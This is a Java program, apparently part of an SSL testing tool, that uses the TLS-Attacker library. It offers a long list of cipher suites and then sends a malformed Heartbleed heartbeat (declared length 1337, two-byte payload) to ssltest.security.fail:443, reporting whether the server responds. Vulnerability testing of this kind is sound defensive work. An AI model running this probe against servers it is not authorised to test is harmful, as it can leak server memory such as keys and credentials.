package de.dogcraft.ssltest;

import java.util.ArrayList;
import java.util.Arrays;

import de.rub.nds.tlsattacker.attacks.config.HeartbleedCommandConfig;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.modifiablevariable.integer.IntegerModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.integer.ModifiableInteger;
import de.rub.nds.tlsattacker.modifiablevariable.singlebyte.ModifiableByte;
import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.tls.config.ClientCommandConfig;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.config.ConfigHandlerFactory;
import de.rub.nds.tlsattacker.tls.config.GeneralConfig;
import de.rub.nds.tlsattacker.tls.constants.CipherSuite;
import de.rub.nds.tlsattacker.tls.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.tls.constants.ProtocolVersion;
import de.rub.nds.tlsattacker.tls.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.tls.protocol.ProtocolMessage;
import de.rub.nds.tlsattacker.tls.protocol.heartbeat.HeartbeatMessage;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.transport.TransportHandler;

public class TLSAttackerClient {

    public static void main(String[] args) {
        ArrayList<CipherSuite> ciphers = new ArrayList<CipherSuite>(Arrays.asList(new CipherSuite[] {
                CipherSuite.TLS_RSA_WITH_NULL_MD5,
                CipherSuite.TLS_RSA_WITH_NULL_SHA,
                CipherSuite.TLS_RSA_EXPORT_WITH_RC4_40_MD5,
                CipherSuite.TLS_RSA_WITH_RC4_128_MD5,
                CipherSuite.TLS_RSA_WITH_RC4_128_SHA,
                CipherSuite.TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5,
                CipherSuite.TLS_RSA_WITH_IDEA_CBC_SHA,
                CipherSuite.TLS_RSA_EXPORT_WITH_DES40_CBC_SHA,
                CipherSuite.TLS_RSA_WITH_DES_CBC_SHA,
                CipherSuite.TLS_RSA_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_DH_DSS_EXPORT_WITH_DES40_CBC_SHA,
                CipherSuite.TLS_DH_DSS_WITH_DES_CBC_SHA,
                CipherSuite.TLS_DH_DSS_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_DH_RSA_EXPORT_WITH_DES40_CBC_SHA,
                CipherSuite.TLS_DH_RSA_WITH_DES_CBC_SHA,
                CipherSuite.TLS_DH_RSA_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA,
                CipherSuite.TLS_DHE_DSS_WITH_DES_CBC_SHA,
                CipherSuite.TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA,
                CipherSuite.TLS_DHE_RSA_WITH_DES_CBC_SHA,
                CipherSuite.TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_DH_anon_EXPORT_WITH_RC4_40_MD5,
                CipherSuite.TLS_DH_anon_WITH_RC4_128_MD5,
                CipherSuite.TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA,
                CipherSuite.TLS_DH_anon_WITH_DES_CBC_SHA,
                CipherSuite.TLS_DH_anon_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_KRB5_WITH_DES_CBC_SHA,
                CipherSuite.TLS_KRB5_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_KRB5_WITH_RC4_128_SHA,
                CipherSuite.TLS_KRB5_WITH_IDEA_CBC_SHA,
                CipherSuite.TLS_KRB5_WITH_DES_CBC_MD5,
                CipherSuite.TLS_KRB5_WITH_3DES_EDE_CBC_MD5,
                CipherSuite.TLS_KRB5_WITH_RC4_128_MD5,
                CipherSuite.TLS_KRB5_WITH_IDEA_CBC_MD5,
                CipherSuite.TLS_KRB5_EXPORT_WITH_DES_CBC_40_SHA,
                CipherSuite.TLS_KRB5_EXPORT_WITH_RC2_CBC_40_SHA,
                CipherSuite.TLS_KRB5_EXPORT_WITH_RC4_40_SHA,
                CipherSuite.TLS_KRB5_EXPORT_WITH_DES_CBC_40_MD5,
                CipherSuite.TLS_KRB5_EXPORT_WITH_RC2_CBC_40_MD5,
                CipherSuite.TLS_KRB5_EXPORT_WITH_RC4_40_MD5,
                CipherSuite.TLS_PSK_WITH_NULL_SHA,
                CipherSuite.TLS_DHE_PSK_WITH_NULL_SHA,
                CipherSuite.TLS_RSA_PSK_WITH_NULL_SHA,
                CipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_DH_DSS_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_DH_RSA_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_DHE_DSS_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_DHE_RSA_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_DH_anon_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_RSA_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_DH_DSS_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_DH_RSA_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_DHE_DSS_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_DHE_RSA_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_DH_anon_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_RSA_WITH_NULL_SHA256,
                CipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA256,
                CipherSuite.TLS_RSA_WITH_AES_256_CBC_SHA256,
                CipherSuite.TLS_DH_DSS_WITH_AES_128_CBC_SHA256,
                CipherSuite.TLS_DH_RSA_WITH_AES_128_CBC_SHA256,
                CipherSuite.TLS_DHE_DSS_WITH_AES_128_CBC_SHA256,
                CipherSuite.TLS_RSA_WITH_CAMELLIA_128_CBC_SHA,
                CipherSuite.TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA,
                CipherSuite.TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA,
                CipherSuite.TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA,
                CipherSuite.TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA,
                CipherSuite.TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA,
                CipherSuite.TLS_RSA_EXPORT1024_WITH_RC4_56_MD5,
                CipherSuite.TLS_RSA_EXPORT1024_WITH_RC2_56_MD5,
                CipherSuite.TLS_RSA_EXPORT1024_WITH_DES_CBC_SHA,
                CipherSuite.TLS_DHE_DSS_EXPORT1024_WITH_DES_CBC_SHA,
                CipherSuite.TLS_RSA_EXPORT1024_WITH_RC4_56_SHA,
                CipherSuite.TLS_DHE_DSS_EXPORT1024_WITH_RC4_56_SHA,
                CipherSuite.TLS_DHE_DSS_WITH_RC4_128_SHA,
                CipherSuite.TLS_DHE_RSA_WITH_AES_128_CBC_SHA256,
                CipherSuite.TLS_DH_DSS_WITH_AES_256_CBC_SHA256,
                CipherSuite.TLS_DH_RSA_WITH_AES_256_CBC_SHA256,
                CipherSuite.TLS_DHE_DSS_WITH_AES_256_CBC_SHA256,
                CipherSuite.TLS_DHE_RSA_WITH_AES_256_CBC_SHA256,
                CipherSuite.TLS_DH_anon_WITH_AES_128_CBC_SHA256,
                CipherSuite.TLS_DH_anon_WITH_AES_256_CBC_SHA256,
                CipherSuite.TLS_GOSTR341094_WITH_28147_CNT_IMIT,
                CipherSuite.TLS_GOSTR341001_WITH_28147_CNT_IMIT,
                CipherSuite.TLS_GOSTR341094_WITH_NULL_GOSTR3411,
                CipherSuite.TLS_GOSTR341001_WITH_NULL_GOSTR3411,
                CipherSuite.TLS_RSA_WITH_CAMELLIA_256_CBC_SHA,
                CipherSuite.TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA,
                CipherSuite.TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA,
                CipherSuite.TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA,
                CipherSuite.TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA,
                CipherSuite.TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA,
                CipherSuite.TLS_PSK_WITH_RC4_128_SHA,
                CipherSuite.TLS_PSK_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_PSK_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_PSK_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_DHE_PSK_WITH_RC4_128_SHA,
                CipherSuite.TLS_DHE_PSK_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_DHE_PSK_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_DHE_PSK_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_RSA_PSK_WITH_RC4_128_SHA,
                CipherSuite.TLS_RSA_PSK_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_RSA_PSK_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_RSA_PSK_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_RSA_WITH_SEED_CBC_SHA,
                CipherSuite.TLS_DH_DSS_WITH_SEED_CBC_SHA,
                CipherSuite.TLS_DH_RSA_WITH_SEED_CBC_SHA,
                CipherSuite.TLS_DHE_DSS_WITH_SEED_CBC_SHA,
                CipherSuite.TLS_DHE_RSA_WITH_SEED_CBC_SHA,
                CipherSuite.TLS_DH_anon_WITH_SEED_CBC_SHA,
                CipherSuite.TLS_RSA_WITH_AES_128_GCM_SHA256,
                CipherSuite.TLS_RSA_WITH_AES_256_GCM_SHA384,
                CipherSuite.TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,
                CipherSuite.TLS_DHE_RSA_WITH_AES_256_GCM_SHA384,
                CipherSuite.TLS_DH_RSA_WITH_AES_128_GCM_SHA256,
                CipherSuite.TLS_DH_RSA_WITH_AES_256_GCM_SHA384,
                CipherSuite.TLS_DHE_DSS_WITH_AES_128_GCM_SHA256,
                CipherSuite.TLS_DHE_DSS_WITH_AES_256_GCM_SHA384,
                CipherSuite.TLS_DH_DSS_WITH_AES_128_GCM_SHA256,
                CipherSuite.TLS_DH_DSS_WITH_AES_256_GCM_SHA384,
                CipherSuite.TLS_DH_anon_WITH_AES_128_GCM_SHA256,
                CipherSuite.TLS_DH_anon_WITH_AES_256_GCM_SHA384,
                CipherSuite.TLS_PSK_WITH_AES_128_GCM_SHA256,
                CipherSuite.TLS_PSK_WITH_AES_256_GCM_SHA384,
                CipherSuite.TLS_DHE_PSK_WITH_AES_128_GCM_SHA256,
                CipherSuite.TLS_DHE_PSK_WITH_AES_256_GCM_SHA384,
                CipherSuite.TLS_RSA_PSK_WITH_AES_128_GCM_SHA256,
                CipherSuite.TLS_RSA_PSK_WITH_AES_256_GCM_SHA384,
                CipherSuite.TLS_PSK_WITH_AES_128_CBC_SHA256,
                CipherSuite.TLS_PSK_WITH_AES_256_CBC_SHA384,
                CipherSuite.TLS_PSK_WITH_NULL_SHA256,
                CipherSuite.TLS_PSK_WITH_NULL_SHA384,
                CipherSuite.TLS_DHE_PSK_WITH_AES_128_CBC_SHA256,
                CipherSuite.TLS_DHE_PSK_WITH_AES_256_CBC_SHA384,
                CipherSuite.TLS_DHE_PSK_WITH_NULL_SHA256,
                CipherSuite.TLS_DHE_PSK_WITH_NULL_SHA384,
                CipherSuite.TLS_RSA_PSK_WITH_AES_128_CBC_SHA256,
                CipherSuite.TLS_RSA_PSK_WITH_AES_256_CBC_SHA384,
                CipherSuite.TLS_RSA_PSK_WITH_NULL_SHA256,
                CipherSuite.TLS_RSA_PSK_WITH_NULL_SHA384,
                CipherSuite.TLS_RSA_WITH_CAMELLIA_128_CBC_SHA256,
                CipherSuite.TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA256,
                CipherSuite.TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA256,
                CipherSuite.TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA256,
                CipherSuite.TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA256,
                CipherSuite.TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA256,
                CipherSuite.TLS_RSA_WITH_CAMELLIA_256_CBC_SHA256,
                CipherSuite.TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA256,
                CipherSuite.TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA256,
                CipherSuite.TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA256,
                CipherSuite.TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA256,
                CipherSuite.TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA256,
                CipherSuite.TLS_ECDH_ECDSA_WITH_NULL_SHA,
                CipherSuite.TLS_ECDH_ECDSA_WITH_RC4_128_SHA,
                CipherSuite.TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_NULL_SHA,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_ECDH_RSA_WITH_NULL_SHA,
                CipherSuite.TLS_ECDH_RSA_WITH_RC4_128_SHA,
                CipherSuite.TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_ECDH_RSA_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_ECDH_RSA_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_ECDHE_RSA_WITH_NULL_SHA,
                CipherSuite.TLS_ECDHE_RSA_WITH_RC4_128_SHA,
                CipherSuite.TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_ECDH_anon_WITH_NULL_SHA,
                CipherSuite.TLS_ECDH_anon_WITH_RC4_128_SHA,
                CipherSuite.TLS_ECDH_anon_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_ECDH_anon_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_ECDH_anon_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_SRP_SHA_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_SRP_SHA_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_SRP_SHA_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384,
                CipherSuite.TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256,
                CipherSuite.TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA384,
                CipherSuite.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,
                CipherSuite.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384,
                CipherSuite.TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256,
                CipherSuite.TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
                CipherSuite.TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256,
                CipherSuite.TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384,
                CipherSuite.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
                CipherSuite.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
                CipherSuite.TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256,
                CipherSuite.TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384,
                CipherSuite.TLS_ECDHE_PSK_WITH_RC4_128_SHA,
                CipherSuite.TLS_ECDHE_PSK_WITH_3DES_EDE_CBC_SHA,
                CipherSuite.TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA,
                CipherSuite.TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA,
                CipherSuite.TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA256,
                CipherSuite.TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA384,
                CipherSuite.TLS_ECDHE_PSK_WITH_NULL_SHA,
                CipherSuite.TLS_ECDHE_PSK_WITH_NULL_SHA256,
                CipherSuite.TLS_ECDHE_PSK_WITH_NULL_SHA384,
                CipherSuite.TLS_RSA_WITH_ARIA_128_CBC_SHA256,
                CipherSuite.TLS_RSA_WITH_ARIA_256_CBC_SHA384,
                CipherSuite.TLS_DH_DSS_WITH_ARIA_128_CBC_SHA256,
                CipherSuite.TLS_DH_DSS_WITH_ARIA_256_CBC_SHA384,
                CipherSuite.TLS_DH_RSA_WITH_ARIA_128_CBC_SHA256,
                CipherSuite.TLS_DH_RSA_WITH_ARIA_256_CBC_SHA384,
                CipherSuite.TLS_DHE_DSS_WITH_ARIA_128_CBC_SHA256,
                CipherSuite.TLS_DHE_DSS_WITH_ARIA_256_CBC_SHA384,
                CipherSuite.TLS_DHE_RSA_WITH_ARIA_128_CBC_SHA256,
                CipherSuite.TLS_DHE_RSA_WITH_ARIA_256_CBC_SHA384,
                CipherSuite.TLS_DH_anon_WITH_ARIA_128_CBC_SHA256,
                CipherSuite.TLS_DH_anon_WITH_ARIA_256_CBC_SHA384,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_ARIA_128_CBC_SHA256,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_ARIA_256_CBC_SHA384,
                CipherSuite.TLS_ECDH_ECDSA_WITH_ARIA_128_CBC_SHA256,
                CipherSuite.TLS_ECDH_ECDSA_WITH_ARIA_256_CBC_SHA384,
                CipherSuite.TLS_ECDHE_RSA_WITH_ARIA_128_CBC_SHA256,
                CipherSuite.TLS_ECDHE_RSA_WITH_ARIA_256_CBC_SHA384,
                CipherSuite.TLS_ECDH_RSA_WITH_ARIA_128_CBC_SHA256,
                CipherSuite.TLS_ECDH_RSA_WITH_ARIA_256_CBC_SHA384,
                CipherSuite.TLS_RSA_WITH_ARIA_128_GCM_SHA256,
                CipherSuite.TLS_RSA_WITH_ARIA_256_GCM_SHA384,
                CipherSuite.TLS_DHE_RSA_WITH_ARIA_128_GCM_SHA256,
                CipherSuite.TLS_DHE_RSA_WITH_ARIA_256_GCM_SHA384,
                CipherSuite.TLS_DH_RSA_WITH_ARIA_128_GCM_SHA256,
                CipherSuite.TLS_DH_RSA_WITH_ARIA_256_GCM_SHA384,
                CipherSuite.TLS_DHE_DSS_WITH_ARIA_128_GCM_SHA256,
                CipherSuite.TLS_DHE_DSS_WITH_ARIA_256_GCM_SHA384,
                CipherSuite.TLS_DH_DSS_WITH_ARIA_128_GCM_SHA256,
                CipherSuite.TLS_DH_DSS_WITH_ARIA_256_GCM_SHA384,
                CipherSuite.TLS_DH_anon_WITH_ARIA_128_GCM_SHA256,
                CipherSuite.TLS_DH_anon_WITH_ARIA_256_GCM_SHA384,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_ARIA_128_GCM_SHA256,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_ARIA_256_GCM_SHA384,
                CipherSuite.TLS_ECDH_ECDSA_WITH_ARIA_128_GCM_SHA256,
                CipherSuite.TLS_ECDH_ECDSA_WITH_ARIA_256_GCM_SHA384,
                CipherSuite.TLS_ECDHE_RSA_WITH_ARIA_128_GCM_SHA256,
                CipherSuite.TLS_ECDHE_RSA_WITH_ARIA_256_GCM_SHA384,
                CipherSuite.TLS_ECDH_RSA_WITH_ARIA_128_GCM_SHA256,
                CipherSuite.TLS_ECDH_RSA_WITH_ARIA_256_GCM_SHA384,
                CipherSuite.TLS_PSK_WITH_ARIA_128_CBC_SHA256,
                CipherSuite.TLS_PSK_WITH_ARIA_256_CBC_SHA384,
                CipherSuite.TLS_DHE_PSK_WITH_ARIA_128_CBC_SHA256,
                CipherSuite.TLS_DHE_PSK_WITH_ARIA_256_CBC_SHA384,
                CipherSuite.TLS_RSA_PSK_WITH_ARIA_128_CBC_SHA256,
                CipherSuite.TLS_RSA_PSK_WITH_ARIA_256_CBC_SHA384,
                CipherSuite.TLS_PSK_WITH_ARIA_128_GCM_SHA256,
                CipherSuite.TLS_PSK_WITH_ARIA_256_GCM_SHA384,
                CipherSuite.TLS_DHE_PSK_WITH_ARIA_128_GCM_SHA256,
                CipherSuite.TLS_DHE_PSK_WITH_ARIA_256_GCM_SHA384,
                CipherSuite.TLS_RSA_PSK_WITH_ARIA_128_GCM_SHA256,
                CipherSuite.TLS_RSA_PSK_WITH_ARIA_256_GCM_SHA384,
                CipherSuite.TLS_ECDHE_PSK_WITH_ARIA_128_CBC_SHA256,
                CipherSuite.TLS_ECDHE_PSK_WITH_ARIA_256_CBC_SHA384,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_CAMELLIA_128_CBC_SHA256,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_CAMELLIA_256_CBC_SHA384,
                CipherSuite.TLS_ECDH_ECDSA_WITH_CAMELLIA_128_CBC_SHA256,
                CipherSuite.TLS_ECDH_ECDSA_WITH_CAMELLIA_256_CBC_SHA384,
                CipherSuite.TLS_ECDHE_RSA_WITH_CAMELLIA_128_CBC_SHA256,
                CipherSuite.TLS_ECDHE_RSA_WITH_CAMELLIA_256_CBC_SHA384,
                CipherSuite.TLS_ECDH_RSA_WITH_CAMELLIA_128_CBC_SHA256,
                CipherSuite.TLS_ECDH_RSA_WITH_CAMELLIA_256_CBC_SHA384,
                CipherSuite.TLS_RSA_WITH_CAMELLIA_128_GCM_SHA256,
                CipherSuite.TLS_RSA_WITH_CAMELLIA_256_GCM_SHA384,
                CipherSuite.TLS_DHE_RSA_WITH_CAMELLIA_128_GCM_SHA256,
                CipherSuite.TLS_DHE_RSA_WITH_CAMELLIA_256_GCM_SHA384,
                CipherSuite.TLS_DH_RSA_WITH_CAMELLIA_128_GCM_SHA256,
                CipherSuite.TLS_DH_RSA_WITH_CAMELLIA_256_GCM_SHA384,
                CipherSuite.TLS_DHE_DSS_WITH_CAMELLIA_128_GCM_SHA256,
                CipherSuite.TLS_DHE_DSS_WITH_CAMELLIA_256_GCM_SHA384,
                CipherSuite.TLS_DH_DSS_WITH_CAMELLIA_128_GCM_SHA256,
                CipherSuite.TLS_DH_DSS_WITH_CAMELLIA_256_GCM_SHA384,
                CipherSuite.TLS_DH_anon_WITH_CAMELLIA_128_GCM_SHA256,
                CipherSuite.TLS_DH_anon_WITH_CAMELLIA_256_GCM_SHA384,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_CAMELLIA_128_GCM_SHA256,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_CAMELLIA_256_GCM_SHA384,
                CipherSuite.TLS_ECDH_ECDSA_WITH_CAMELLIA_128_GCM_SHA256,
                CipherSuite.TLS_ECDH_ECDSA_WITH_CAMELLIA_256_GCM_SHA384,
                CipherSuite.TLS_ECDHE_RSA_WITH_CAMELLIA_128_GCM_SHA256,
                CipherSuite.TLS_ECDHE_RSA_WITH_CAMELLIA_256_GCM_SHA384,
                CipherSuite.TLS_ECDH_RSA_WITH_CAMELLIA_128_GCM_SHA256,
                CipherSuite.TLS_ECDH_RSA_WITH_CAMELLIA_256_GCM_SHA384,
                CipherSuite.TLS_PSK_WITH_CAMELLIA_128_GCM_SHA256,
                CipherSuite.TLS_PSK_WITH_CAMELLIA_256_GCM_SHA384,
                CipherSuite.TLS_DHE_PSK_WITH_CAMELLIA_128_GCM_SHA256,
                CipherSuite.TLS_DHE_PSK_WITH_CAMELLIA_256_GCM_SHA384,
                CipherSuite.TLS_RSA_PSK_WITH_CAMELLIA_128_GCM_SHA256,
                CipherSuite.TLS_RSA_PSK_WITH_CAMELLIA_256_GCM_SHA384,
                CipherSuite.TLS_PSK_WITH_CAMELLIA_128_CBC_SHA256,
                CipherSuite.TLS_PSK_WITH_CAMELLIA_256_CBC_SHA384,
                CipherSuite.TLS_DHE_PSK_WITH_CAMELLIA_128_CBC_SHA256,
                CipherSuite.TLS_DHE_PSK_WITH_CAMELLIA_256_CBC_SHA384,
                CipherSuite.TLS_RSA_PSK_WITH_CAMELLIA_128_CBC_SHA256,
                CipherSuite.TLS_RSA_PSK_WITH_CAMELLIA_256_CBC_SHA384,
                CipherSuite.TLS_ECDHE_PSK_WITH_CAMELLIA_128_CBC_SHA256,
                CipherSuite.TLS_ECDHE_PSK_WITH_CAMELLIA_256_CBC_SHA384,
                CipherSuite.TLS_RSA_WITH_AES_128_CCM,
                CipherSuite.TLS_RSA_WITH_AES_256_CCM,
                CipherSuite.TLS_DHE_RSA_WITH_AES_128_CCM,
                CipherSuite.TLS_DHE_RSA_WITH_AES_256_CCM,
                CipherSuite.TLS_RSA_WITH_AES_128_CCM_8,
                CipherSuite.TLS_RSA_WITH_AES_256_CCM_8,
                CipherSuite.TLS_DHE_RSA_WITH_AES_128_CCM_8,
                CipherSuite.TLS_DHE_RSA_WITH_AES_256_CCM_8,
                CipherSuite.TLS_PSK_WITH_AES_128_CCM,
                CipherSuite.TLS_PSK_WITH_AES_256_CCM,
                CipherSuite.TLS_DHE_PSK_WITH_AES_128_CCM,
                CipherSuite.TLS_DHE_PSK_WITH_AES_256_CCM,
                CipherSuite.TLS_PSK_WITH_AES_128_CCM_8,
                CipherSuite.TLS_PSK_WITH_AES_256_CCM_8,
                CipherSuite.TLS_PSK_DHE_WITH_AES_128_CCM_8,
                CipherSuite.TLS_PSK_DHE_WITH_AES_256_CCM_8,
                CipherSuite.TLS_PSK_DHE_WITH_AES_256_CCM_80,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_128_CCM,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_256_CCM,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_128_CCM_8,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_256_CCM_8,
                CipherSuite.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
                CipherSuite.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
                CipherSuite.TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256
        }));

        GeneralConfig generalConfig = new GeneralConfig();
        generalConfig.setQuiet(false);
        generalConfig.setDebug(true);

        HeartbleedCommandConfig heartbleed = new HeartbleedCommandConfig();
        heartbleed.setConnect("ssltest.security.fail:443");
        heartbleed.setProtocolVersion(ProtocolVersion.TLS12);
        heartbleed.setCipherSuites(ciphers);

        Attacker<ClientCommandConfig> attacker = new Attacker<ClientCommandConfig>(heartbleed) {

            @Override
            public void executeAttack(ConfigHandler configHandler) {
                TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
                TlsContext tlsContext = configHandler.initializeTlsContext(config);

                WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

                WorkflowTrace trace = tlsContext.getWorkflowTrace();

                ModifiableByte heartbeatMessageType = new ModifiableByte();
                ModifiableInteger payloadLength = new ModifiableInteger();
                payloadLength.setModification(IntegerModificationFactory.explicitValue(1337));
                ModifiableByteArray payload = new ModifiableByteArray();
                payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
                HeartbeatMessage hb = (HeartbeatMessage) trace.getFirstProtocolMessage(ProtocolMessageType.HEARTBEAT);
                hb.setHeartbeatMessageType(heartbeatMessageType);
                hb.setPayload(payload);
                hb.setPayloadLength(payloadLength);

                try {
                    workflowExecutor.executeWorkflow();
                } catch (WorkflowExecutionException ex) {
                    System.out.println("The TLS protocol flow was not executed completely, follow the debug messages for more information.");
                    ex.printStackTrace(System.out);
                }

                if (trace.containsServerFinished()) {
                    ProtocolMessage lastMessage = trace.getLastServerMesssage();
                    if (lastMessage.getProtocolMessageType() == ProtocolMessageType.HEARTBEAT) {
                        System.out.println("Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid ");
                        vulnerable = true;
                    } else {
                        System.out.println("(Most probably) Not vulnerable. The server does not respond with a heartbeat message, it is not vulnerable");
                        vulnerable = false;
                    }
                } else {
                    System.out.println("Correct TLS handshake cannot be executed, no Server Finished message found. Check the server configuration.");
                }

                tlsContexts.add(tlsContext);

                transportHandler.closeConnection();
            }

        };

        ConfigHandler configHandler = ConfigHandlerFactory.createConfigHandler(ClientCommandConfig.COMMAND);
        configHandler.initialize(generalConfig);

        attacker.executeAttack(configHandler);
    }

}
